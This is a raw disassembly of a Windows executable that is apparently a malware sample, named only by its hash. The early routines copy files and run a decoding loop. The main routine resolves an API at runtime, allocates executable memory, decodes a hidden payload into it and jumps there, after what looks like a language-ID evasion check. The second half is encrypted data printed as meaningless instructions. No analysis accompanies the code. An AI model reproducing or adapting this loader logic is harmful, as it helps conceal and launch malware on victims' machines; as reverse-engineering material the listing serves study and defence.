
edaf7e765c1e9cef194464ff9686e20e83d88f139d9fd20b7c14acd2a3ed5fd3.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x4291e0
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x4291d8
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429018
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429014
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429010
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x42900c
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x429028
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429040
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x429048
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x429118
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291a0
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x429178
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429148
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429120
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  edx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    eax,DWORD PTR [esp+0x10]
  4111a9:	mov    ecx,DWORD PTR [esp+0x14]
  4111ad:	add    eax,ecx
  4111af:	mov    DWORD PTR [esp+0x10],eax
  4111b3:	shr    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    ecx,eax
  4111bb:	shr    ecx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,ecx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	mov    ecx,DWORD PTR [esp+0x24]
  4111d6:	add    bl,dl
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x48],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x70],0x0
  41120b:	mov    DWORD PTR [ebp-0x60],0x0
  411212:	mov    DWORD PTR [ebp-0x8],0x0
  411219:	mov    DWORD PTR [ebp-0x6c],0x0
  411220:	mov    DWORD PTR [ebp-0x68],0x0
  411227:	mov    DWORD PTR [ebp-0x14],0x0
  41122e:	mov    DWORD PTR [ebp-0x4c],0x0
  411235:	mov    DWORD PTR [ebp-0x10],0x0
  41123c:	mov    DWORD PTR [ebp-0x58],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x5c],0x0
  411251:	mov    DWORD PTR [ebp-0x30],0x0
  411258:	mov    DWORD PTR [ebp-0x54],0x0
  41125f:	mov    DWORD PTR [ebp-0x2c],0x0
  411266:	mov    DWORD PTR [ebp-0x50],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x42920c
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429210
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x429214
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429218
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x4291fc
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429200
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x429204
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429208
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x42920a
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	lea    eax,[ebp-0x10]
  4112ce:	push   eax
  4112cf:	push   0x4291e8
  4112d4:	call   DWORD PTR ds:0x429004
  4112da:	test   eax,eax
  4112dc:	je     0x411324
  4112de:	push   0x0
  4112e0:	push   0x0
  4112e2:	push   0x0
  4112e4:	call   DWORD PTR ds:0x429034
  4112ea:	mov    DWORD PTR [ebp-0x14],eax
  4112ed:	lea    ecx,[ebp-0x40]
  4112f0:	push   ecx
  4112f1:	lea    edx,[ebp-0x10]
  4112f4:	push   edx
  4112f5:	call   DWORD PTR ds:0x429000
  4112fb:	test   eax,eax
  4112fd:	je     0x411324
  4112ff:	mov    eax,DWORD PTR [ebp-0x10]
  411302:	add    eax,0x1
  411305:	mov    DWORD PTR [ebp-0x10],eax
  411308:	push   0x14
  41130a:	push   0x0
  41130c:	mov    ecx,DWORD PTR [ebp-0x14]
  41130f:	push   ecx
  411310:	call   DWORD PTR ds:0x429030
  411316:	push   0x0
  411318:	push   0x0
  41131a:	mov    edx,DWORD PTR [ebp-0x14]
  41131d:	push   edx
  41131e:	call   DWORD PTR ds:0x42902c
  411324:	mov    BYTE PTR [ebp-0x40],0x56
  411328:	call   DWORD PTR ds:0x429044
  41132e:	mov    DWORD PTR [ebp-0x2c],eax
  411331:	mov    BYTE PTR [ebp-0x3e],0x72
  411335:	movzx  eax,WORD PTR [ebp-0x2c]
  411339:	cmp    eax,0x539
  41133e:	jne    0x411380
  411340:	mov    BYTE PTR [ebp-0x34],0x0
  411344:	mov    DWORD PTR [ebp-0x14],0xe0d
  41134b:	lea    ecx,[ebp-0x28]
  41134e:	push   ecx
  41134f:	call   DWORD PTR ds:0x429024
  411355:	mov    DWORD PTR [ebp-0x60],eax
  411358:	mov    DWORD PTR [ebp-0x54],0x3a
  41135f:	lea    edx,[ebp-0x40]
  411362:	push   edx
  411363:	mov    eax,DWORD PTR [ebp-0x60]
  411366:	push   eax
  411367:	call   DWORD PTR ds:0x429020
  41136d:	mov    DWORD PTR [ebp-0x44],eax
  411370:	mov    DWORD PTR [ebp-0x8],0xcd294c35
  411377:	mov    DWORD PTR [ebp-0x68],0x10d93f
  41137e:	jmp    0x411395
  411380:	mov    BYTE PTR ds:0x444a58,0x0
  411387:	mov    BYTE PTR ds:0x42cb88,0x0
  41138e:	mov    BYTE PTR ds:0x442b18,0x0
  411395:	mov    DWORD PTR [ebp-0x2c],0x410000
  41139c:	push   DWORD PTR ds:0x429024
  4113a2:	pop    edx
  4113a3:	mov    DWORD PTR [ebp-0x6c],edx
  4113a6:	push   DWORD PTR [ebp-0x30]
  4113a9:	push   0x1000
  4113ae:	mov    eax,DWORD PTR [ebp-0x14]
  4113b1:	add    eax,0x23
  4113b4:	add    eax,0x23
  4113b7:	push   eax
  4113b8:	xor    eax,eax
  4113ba:	push   eax
  4113bb:	mov    ecx,DWORD PTR [ebp-0x44]
  4113be:	call   ecx
  4113c0:	push   eax
  4113c1:	pop    ecx
  4113c2:	mov    DWORD PTR [ebp-0x4],ecx
  4113c5:	mov    ecx,DWORD PTR [ebp-0x68]
  4113c8:	sub    ecx,0xdae0b
  4113ce:	mov    DWORD PTR [ebp-0x68],ecx
  4113d1:	cmp    DWORD PTR [ebp-0x4],0x0
  4113d5:	jne    0x4113de
  4113d7:	mov    BYTE PTR ds:0x442b18,0x0
  4113de:	mov    edx,DWORD PTR [ebp-0x4]
  4113e1:	add    edx,DWORD PTR [ebp-0x14]
  4113e4:	mov    eax,DWORD PTR [ebp-0x8]
  4113e7:	mov    DWORD PTR [edx],eax
  4113e9:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ec:	add    ecx,DWORD PTR [ebp-0x54]
  4113ef:	mov    DWORD PTR [ebp-0x5c],ecx
  4113f2:	mov    edx,DWORD PTR ds:0x429020
  4113f8:	mov    DWORD PTR [ebp-0x4c],edx
  4113fb:	mov    eax,DWORD PTR [ebp-0x4]
  4113fe:	add    eax,DWORD PTR [ebp-0x14]
  411401:	mov    ecx,DWORD PTR [ebp+0x8]
  411404:	mov    DWORD PTR [eax+0x4],ecx
  411407:	mov    edx,DWORD PTR [ebp-0x4]
  41140a:	add    edx,DWORD PTR [ebp-0x14]
  41140d:	mov    DWORD PTR [ebp-0xc],edx
  411410:	cmp    DWORD PTR [ebp-0x68],0x0
  411414:	jbe    0x411431
  411416:	mov    eax,DWORD PTR [ebp-0xc]
  411419:	push   eax
  41141a:	mov    ecx,DWORD PTR [ebp-0x14]
  41141d:	push   ecx
  41141e:	mov    edx,DWORD PTR [ebp-0x2c]
  411421:	add    edx,DWORD PTR [ebp-0x68]
  411424:	push   edx
  411425:	mov    eax,DWORD PTR [ebp-0x4]
  411428:	push   eax
  411429:	call   0x411170
  41142e:	add    esp,0x10
  411431:	cmp    DWORD PTR [ebp-0x5c],0x0
  411435:	je     0x411448
  411437:	push   DWORD PTR [ebp-0x4c]
  41143a:	push   DWORD PTR [ebp-0x6c]
  41143d:	mov    edx,DWORD PTR [ebp-0x5c]
  411440:	push   eax
  411441:	jmp    edx
  411443:	jmp    0x422f1d
  411448:	mov    ecx,DWORD PTR [ebp+0x8]
  41144b:	mov    DWORD PTR [ebp-0x18],ecx
  41144e:	fdivr  DWORD PTR [eax+0x5b]
  411451:	adc    al,0xfb
  411453:	loope  0x41143b
  411455:	cmp    DWORD PTR [esi-0x9],esi
  411458:	jge    0x411498
  41145a:	mov    ds:0xef52b05f,al
  41145f:	stos   BYTE PTR es:[edi],al
  411460:	fwait
  411461:	push   ds
  411462:	mov    ds:0x359dfd5c,al
  411467:	daa    
  411468:	(bad)  
  411469:	test   BYTE PTR [eax+0x35a5260],0x62
  411470:	and    al,0x58
  411472:	sbb    DWORD PTR [eax+ebx*8-0x3c5e78e5],esp
  411479:	push   esi
  41147a:	or     eax,0x285b6564
  41147f:	xor    BYTE PTR [esi-0x7e],dl
  411482:	out    dx,eax
  411483:	(bad)  
  411485:	mov    WORD PTR [ebx+edi*8-0x43],ss
  411489:	xlat   BYTE PTR ds:[ebx]
  41148a:	cli    
  41148b:	leave  
  41148c:	push   es
  41148d:	enter  0xe707,0x1a
  411491:	mov    ebx,0x221ca5b4
  411496:	aad    0xa4
  411498:	retf   
  411499:	adc    BYTE PTR ds:0xe87273fd,ah
  41149f:	push   edx
  4114a0:	pop    ebx
  4114a1:	adc    dh,BYTE PTR [ebx-0x63fb119b]
  4114a7:	enter  0xc42b,0xb2
  4114ab:	xor    ecx,DWORD PTR [edi]
  4114ad:	adc    al,0x64
  4114af:	stos   BYTE PTR es:[edi],al
  4114b0:	jne    0x411456
  4114b2:	sbb    dh,BYTE PTR es:[esi+0x7d]
  4114b6:	dec    eax
  4114b7:	das    
  4114b8:	add    ebx,DWORD PTR [eax-0x67]
  4114bb:	and    eax,0x23bc22d0
  4114c0:	fwait
  4114c1:	retf   
  4114c2:	push   ss
  4114c3:	jb     0x4114da
  4114c5:	(bad)  
  4114c6:	cli    
  4114c7:	(bad)  [edx-0x2de7c1d3]
  4114cd:	push   ecx
  4114ce:	das    
  4114cf:	pop    ebp
  4114d0:	push   edi
  4114d1:	fsubp  st(7),st
  4114d3:	mov    ebx,0x5a107954
  4114d8:	cmp    al,0x7
  4114da:	int3   
  4114db:	sbb    eax,0x4b8f8392
  4114e0:	inc    ecx
  4114e1:	inc    edi
  4114e2:	jmp    0x61a746f5
  4114e7:	ins    BYTE PTR es:[edi],dx
  4114e8:	icebp  
  4114e9:	cmp    ah,BYTE PTR [eax]
  4114eb:	mov    dh,0x4d
  4114ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114ee:	jge    0x411519
  4114f0:	aaa    
  4114f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114f2:	mov    esp,0xc32767e6
  4114f7:	dec    ebp
  4114f8:	pop    ecx
  4114f9:	lock (bad) 
  4114fb:	daa    
  4114fc:	or     al,0x53
  4114fe:	mov    WORD PTR [ebx+0x17],ss
  411501:	inc    eax
  411502:	jg     0x411551
  411504:	(bad)  
  411505:	mov    ebp,0x908778a1
  41150a:	push   0x695b987b
  41150f:	dec    ebx
  411510:	mov    al,ds:0x95633183
  411515:	or     al,0x35
  411517:	add    eax,0xf8fbf593
  41151c:	cli    
  41151d:	jno    0x4114c8
  41151f:	jnp    0xbb9fd5fe
  411525:	push   ecx
  411526:	push   es
  411527:	loope  0x411573
  411529:	lods   eax,DWORD PTR ds:[esi]
  41152a:	cmp    BYTE PTR ds:0xbcf49bfc,dl
  411530:	mov    al,ds:0x882489a3
  411535:	mov    bl,0x4e
  411537:	sbb    BYTE PTR [ebx],bl
  411539:	jnp    0x411541
  41153b:	xchg   esi,eax
  41153c:	bound  edx,QWORD PTR [esi+0x60]
  41153f:	mov    dh,0x28
  411541:	sbb    ah,BYTE PTR [edx+ebx*2+0x33]
  411545:	xor    al,0xa1
  411547:	jnp    0x41153d
  411549:	mov    ecx,DWORD PTR [esi-0x42]
  41154c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41154d:	mov    al,ds:0xdf26bd41
  411552:	hlt    
  411553:	rcl    ch,0xb2
  411556:	push   ebx
  411557:	mov    WORD PTR [esi+edi*1+0x13],es
  41155b:	cmp    DWORD PTR [esi+ebp*8],edx
  41155e:	cmp    bh,BYTE PTR [esp+ecx*8-0x5b]
  411562:	leave  
  411563:	test   dl,dl
  411565:	pushf  
  411566:	imul   ebp,DWORD PTR ds:0x32affb2d,0x5eb43cb8
  411570:	mov    esi,0x9a2bf0f0
  411575:	sar    ch,1
  411577:	xchg   esi,eax
  411578:	and    BYTE PTR [edx-0x542a6733],0x6c
  41157f:	mov    edx,esi
  411581:	push   edi
  411582:	(bad)  
  411583:	mov    al,ds:0x63307ca9
  411588:	aad    0xb7
  41158a:	jmp    0xa8e13900
  41158f:	sub    eax,0x46a88bcc
  411594:	lahf   
  411595:	push   ds
  411596:	dec    ecx
  411597:	js     0x4115a4
  411599:	dec    edx
  41159a:	add    al,0x48
  41159c:	lds    edx,FWORD PTR [eax]
  41159e:	or     BYTE PTR [ecx],al
  4115a0:	dec    eax
  4115a1:	or     eax,0x8479e439
  4115a6:	ins    DWORD PTR es:[edi],dx
  4115a7:	push   esp
  4115a8:	and    bl,BYTE PTR [esi]
  4115aa:	jle    0x4115b3
  4115ac:	and    al,BYTE PTR [ebp-0xd]
  4115af:	das    
  4115b0:	test   eax,0xf5e28026
  4115b5:	jg     0x4115c3
  4115b7:	jg     0x41153c
  4115b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115ba:	(bad)  
  4115bb:	cli    
  4115bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115bd:	fwait
  4115be:	jge    0x4115be
  4115c0:	pushf  
  4115c1:	sbb    DWORD PTR [eax],ebx
  4115c3:	and    al,0x97
  4115c5:	fsubr  QWORD PTR ss:[ebx+0xe96b5be]
  4115cc:	pop    esi
  4115cd:	push   0xbaf24752
  4115d2:	cmp    BYTE PTR [ecx],dh
  4115d4:	enter  0x23b4,0x60
  4115d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115d9:	shr    DWORD PTR [ecx-0x7844d5f6],0xc3
  4115e0:	fadd   QWORD PTR [ebx+0x3f0d15d2]
  4115e6:	push   edx
  4115e7:	add    bh,BYTE PTR [edi]
  4115e9:	pop    ecx
  4115ea:	test   DWORD PTR [ebx-0x7d64275a],esp
  4115f0:	ja     0x411623
  4115f2:	sahf   
  4115f3:	mov    eax,0xa93625c0
  4115f8:	push   ds
  4115f9:	fwait
  4115fa:	or     DWORD PTR [esi],edx
  4115fc:	test   eax,0xf59d8b32
  411601:	fcomip st,st(0)
  411603:	mov    esi,0xc0d64505
  411608:	jo     0x41160d
  41160a:	lea    edi,[eax+0x2047de5d]
  411610:	imul   esp,DWORD PTR [ecx+edi*1-0x6f],0xffffff91
  411615:	adc    eax,0xe66d1b05
  41161a:	mov    al,0x67
  41161c:	int    0x4b
  41161e:	push   ecx
  41161f:	dec    ecx
  411620:	sbb    esi,DWORD PTR [esi+0xb]
  411623:	loope  0x411667
  411625:	sbb    al,0x19
  411627:	inc    edi
  411628:	cld    
  411629:	fiadd  DWORD PTR [ebp-0x39809504]
  41162f:	dec    ebp
  411630:	xor    bh,BYTE PTR [esi-0x14]
  411633:	lods   eax,DWORD PTR ds:[esi]
  411634:	mov    ah,0xff
  411636:	xor    esp,edx
  411638:	jne    0x411662
  41163a:	lds    esp,FWORD PTR [eax+0x3281cec9]
  411640:	or     ch,BYTE PTR [ebp+eax*8-0x5c09b265]
  411647:	mov    cl,dh
  411649:	or     al,0xdb
  41164b:	xchg   esp,eax
  41164c:	mov    BYTE PTR [edi],0x88
  41164f:	pop    ebx
  411650:	jo     0x411617
  411652:	and    bl,cl
  411654:	cmp    edi,DWORD PTR [ebx+0x461b6955]
  41165a:	push   cs
  41165b:	in     eax,0x78
  41165d:	(bad)  
  41165e:	lods   al,BYTE PTR ds:[esi]
  41165f:	jmp    0x6782ec8d
  411664:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411665:	fdivr  DWORD PTR [ebx]
  411667:	or     BYTE PTR [esi-0x654c7719],dh
  41166d:	(bad)  
  41166e:	xchg   ebp,eax
  41166f:	add    cl,BYTE PTR [eax+0x6]
  411672:	popf   
  411673:	cmp    al,0x58
  411675:	adc    BYTE PTR [esp+ecx*2],al
  411678:	sub    DWORD PTR [edi+edx*1-0x2a],0xffffffea
  41167d:	shl    BYTE PTR [eax+0x34bcb1c0],1
  411683:	push   0xe303db45
  411688:	sbb    eax,0x88c08627
  41168d:	mov    eax,0xf9cf861f
  411692:	mov    dh,0xae
  411694:	adc    BYTE PTR [ebp+0x7f815d11],dh
  41169a:	jo     0x411670
  41169c:	jbe    0x4116fe
  41169e:	ins    BYTE PTR es:[edi],dx
  41169f:	out    dx,al
  4116a0:	dec    esi
  4116a1:	add    eax,0xcbaa6f3e
  4116a6:	mov    esp,0x1590a902
  4116ab:	test   eax,0x97a35ed3
  4116b0:	outs   dx,DWORD PTR ds:[esi]
  4116b1:	imul   edi,DWORD PTR [eax+0x4fccd604],0xffffffe4
  4116b8:	enter  0xf01f,0x2f
  4116bc:	mov    bl,0xb2
  4116be:	ins    BYTE PTR es:[edi],dx
  4116bf:	scas   al,BYTE PTR es:[edi]
  4116c0:	mov    BYTE PTR [ecx],0x10
  4116c3:	push   0x29
  4116c5:	lds    ebp,FWORD PTR [esi]
  4116c7:	jmp    0x1421:0xd7d9a1dd
  4116ce:	mov    dl,0x8a
  4116d0:	aaa    
  4116d1:	cmp    eax,0xfe4f4cb7
  4116d6:	xchg   edi,eax
  4116d7:	in     eax,0xb3
  4116d9:	sbb    BYTE PTR [ebx],al
  4116db:	int    0x7a
  4116dd:	mov    eax,0xcae4498
  4116e2:	out    dx,eax
  4116e3:	or     ch,BYTE PTR [esp+ecx*4]
  4116e6:	push   es
  4116e7:	aad    0xd8
  4116e9:	mov    ds:0xcc790a36,al
  4116ee:	dec    esi
  4116ef:	push   esp
  4116f0:	rcr    BYTE PTR [ebx-0x44],0x8b
  4116f4:	sbb    eax,0xd10103c6
  4116f9:	xchg   BYTE PTR [edi-0x35],dh
  4116fc:	pop    ss
  4116fd:	sbb    ecx,DWORD PTR ds:0x7a71835f
  411703:	imul   ebp,esp,0x565cbfe8
  411709:	ja     0x4116bb
  41170b:	and    cl,dh
  41170d:	cmp    bh,BYTE PTR [ebp+eiz*2+0x625250f8]
  411714:	fcom   QWORD PTR ds:0x4deb44e3
  41171a:	jle    0x4116bf
  41171c:	inc    esi
  41171d:	cmp    al,0x2f
  41171f:	enter  0x6b22,0xd4
  411723:	adc    DWORD PTR [edi],ebx
  411725:	mov    ds:0xf3dd43c,al
  41172a:	sti    
  41172b:	push   edi
  41172c:	clc    
  41172d:	imul   esi,DWORD PTR [edx+0x77],0x19e5dd3e
  411734:	add    al,0xfb
  411736:	fsub   QWORD PTR [ebp+0x33]
  411739:	add    eax,0x5488713b
  41173e:	aas    
  41173f:	(bad)  
  411740:	popa   
  411741:	pop    ds
  411742:	rcr    DWORD PTR [edi],1
  411744:	rol    edi,cl
  411746:	shl    BYTE PTR [eax+ebp*8],0x70
  41174a:	sbb    ecx,esi
  41174c:	lea    edx,[esi-0x414e4a94]
  411752:	(bad)  
  411753:	mov    dl,0x51
  411755:	push   0x9e9e1f6d
  41175a:	sub    al,0x6
  41175c:	cld    
  41175d:	clc    
  41175e:	mov    dl,0x5e
  411760:	inc    ecx
  411761:	jns    0x411758
  411763:	repnz sbb BYTE PTR [edx+0x22],dh
  411767:	enter  0x1226,0x53
  41176b:	xchg   edi,eax
  41176c:	push   edx
  41176d:	out    dx,al
  41176e:	stos   BYTE PTR es:[edi],al
  41176f:	cmp    ecx,0x71
  411772:	les    edx,FWORD PTR [edi]
  411774:	call   0xd350e63f
  411779:	sbb    ebx,DWORD PTR [edi+0x4b]
  41177c:	fidivr WORD PTR ds:0x8a5807f2
  411782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411783:	test   al,0x1e
  411785:	arpl   WORD PTR [esi],bp
  411787:	and    al,0x21
  411789:	or     al,0x4f
  41178b:	arpl   dx,dx
  41178d:	dec    esi
  41178e:	or     al,BYTE PTR [edx+0x37bdf8ea]
  411794:	popf   
  411795:	fidivr DWORD PTR [edi+0x8]
  411798:	add    al,0x20
  41179a:	loope  0x41176e
  41179c:	xchg   esp,eax
  41179d:	dec    ebp
  41179e:	cmp    ah,bl
  4117a0:	call   0xd7b93b7f
  4117a5:	paddusb mm3,QWORD PTR [esi-0x1647203a]
  4117ac:	adc    BYTE PTR [eax-0x5932ee9e],dh
  4117b2:	lods   al,BYTE PTR ds:[esi]
  4117b3:	(bad)  
  4117b4:	cmc    
  4117b5:	clc    
  4117b6:	mov    al,ds:0x901cf7c7
  4117bb:	or     eax,0xce54f01c
  4117c0:	sub    BYTE PTR [ebx],ch
  4117c2:	xchg   ecx,eax
  4117c3:	cli    
  4117c4:	or     al,0xe8
  4117c6:	shl    DWORD PTR [edi-0x11],1
  4117c9:	dec    ebx
  4117ca:	pop    ss
  4117cb:	pop    es
  4117cc:	pop    ds
  4117cd:	inc    ebx
  4117ce:	nop
  4117cf:	xchg   edx,eax
  4117d0:	mov    ds:0x13273b1b,eax
  4117d5:	je     0x41175f
  4117d7:	inc    edx
  4117d8:	das    
  4117d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117da:	lahf   
  4117db:	push   ebp
  4117dc:	and    BYTE PTR [edx-0x34],0x86
  4117e0:	inc    ecx
  4117e1:	add    BYTE PTR [esi-0x6854f8fa],ah
  4117e7:	jle    0x411868
  4117e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117ea:	xchg   ebx,eax
  4117eb:	ret    0x8b7d
  4117ee:	out    dx,al
  4117ef:	test   eax,0xa56de64
  4117f4:	inc    esi
  4117f5:	ret    
  4117f6:	outs   dx,BYTE PTR ds:[esi]
  4117f7:	jge    0x41184f
  4117f9:	das    
  4117fa:	stc    
  4117fb:	pop    es
  4117fc:	xchg   ebx,eax
  4117fd:	add    al,0xd4
  4117ff:	aaa    
  411800:	pop    esp
  411801:	addr16 clc 
  411803:	daa    
  411804:	mov    ecx,0x99319d77
  411809:	das    
  41180a:	xor    DWORD PTR [ebx],esp
  41180c:	dec    eax
  41180d:	int3   
  41180e:	or     BYTE PTR [esi-0x58],dl
  411811:	(bad)  
  411812:	mov    al,ds:0x16a6cb02
  411817:	repz push ss
  411819:	mov    ah,0xdd
  41181b:	cmp    bh,BYTE PTR [edx-0x46]
  41181e:	jg     0x41180c
  411820:	jmp    0x2085:0x416acfa2
  411827:	dec    eax
  411828:	not    DWORD PTR [edx+0x1b815bdc]
  41182e:	inc    edi
  41182f:	xchg   bp,ax
  411831:	mov    eax,0x4ea7c7ea
  411836:	iret   
  411837:	call   0x406e1145
  41183c:	adc    al,0xfe
  41183e:	mov    WORD PTR [ebp+0x40cee2d9],es
  411844:	pop    es
  411845:	popa   
  411846:	lahf   
  411847:	lds    esi,FWORD PTR [edx-0x4e25f841]
  41184d:	mov    ds:0x80df88ad,eax
  411852:	fucomip st,st(3)
  411854:	cli    
  411855:	stc    
  411856:	dec    eax
  411857:	cwde   
  411858:	lds    edx,FWORD PTR ds:0x7a8c7da7
  41185e:	push   ebp
  41185f:	loope  0x411877
  411861:	xlat   BYTE PTR ds:[ebx]
  411862:	mov    dl,0x54
  411864:	and    bl,bh
  411866:	pop    esp
  411867:	jno    0x41187e
  411869:	mov    ebx,0xa4a2caba
  41186e:	xor    BYTE PTR [eax-0x3c18b212],cl
  411874:	fwait
  411875:	pop    ds
  411876:	enter  0xdf01,0xf7
  41187a:	dec    edx
  41187b:	stos   BYTE PTR es:[edi],al
  41187c:	mov    eax,edi
  41187e:	ja     0x411826
  411880:	out    dx,al
  411881:	xchg   DWORD PTR [eax-0x6637b5c5],eax
  411887:	mov    dh,0xc8
  411889:	xor    esp,ebx
  41188b:	pop    edx
  41188c:	xchg   esp,eax
  41188d:	sbb    bh,al
  41188f:	iret   
  411890:	out    0x29,eax
  411892:	mov    esi,0x9bca7ef5
  411897:	pop    eax
  411898:	mov    ebp,0x87adac5a
  41189d:	ins    DWORD PTR es:[edi],dx
  41189e:	adc    bh,BYTE PTR [ebx]
  4118a0:	inc    ebp
  4118a1:	push   cs
  4118a2:	pop    esp
  4118a3:	pop    ds
  4118a4:	jne    0x411838
  4118a6:	gs addr16 aad 0xab
  4118aa:	rol    esi,1
  4118ac:	mov    edx,0x73138f77
  4118b1:	neg    DWORD PTR [ebp+0x78]
